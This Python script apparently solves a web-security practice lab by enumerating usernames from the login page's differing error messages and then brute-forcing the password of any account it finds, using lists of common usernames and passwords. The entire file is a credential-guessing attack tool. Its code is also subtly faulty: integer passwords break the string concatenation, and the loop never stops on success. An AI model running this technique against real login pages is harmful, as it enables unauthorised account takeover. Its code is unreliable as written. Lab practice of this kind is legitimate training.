import requests
import sys
'''
username enumeration via different responses
'''
usernames = ["carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user", "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user", "vagrant", "azureuser", "academico", "acceso", "access", "accounting", "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin", "administracion", "administrador", "administrator", "administrators", "admins", "ads", "adserver", "adsl", "ae", "af", "affiliate", "affiliates", "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai", "al", "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind", "am", "amarillo", "americas", "an", "anaheim", "analyzer", "announce", "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app", "app01", "app1", "apple", "application", "applications", "apps", "appserver", "aq", "ar", "archie", "arcsight", "argentina", "arizona", "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena", "atlanta", "atlas", "att", "au", "auction", "austin", "auth", "auto", "autodiscover"]

passwords = [123456, "password", 12345678, "qwerty", 123456789, 12345, 1234, 111111, 1234567, "dragon", 123123, "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", 666666, "qwertyuiop", 123321, "mustang", 1234567890, "michael", 654321, "superman", "1qaz2wsx", 7777777, 121212, 000000, "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", 2000, "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", 112233, "george", "computer", "michelle", "jessica", "pepper", 1111, "zxcvbn", 555555, 11111111, 131313, "freedom", 777777, "pass", "maggie", 159753, "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", 987654321, "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"]

requests.packages.urllib3.disable_warnings()
print("[+] Started Cracking Username")
for i in usernames:
    sys.stdout.write('\r' +"trying username == " + i)
    sys.stdout.flush()

    data = {
        "username": i,
        "password": "invalidPassword200%"
    }
    
    url = 'https://0ad3009d03ff417980b6bc9b004800f2.web-security-academy.net/login'
    r = requests.post(url=url, data=data, verify=False)
    
    if "Invalid username" not in r.text:
        print(f"Found username {i}")
        print("[+] Starting cracking passwords")
        for p in passwords:
            sys.stdout.write('\r' + "trying password == " + p)
            sys.stdout.flush()
            data = {
                "username": i,
                "password": p
            }
            r = requests.post(url=url, data=data, verify=False)
            if "Incorrect" not in r.text:
                print(f"Password is {p}")

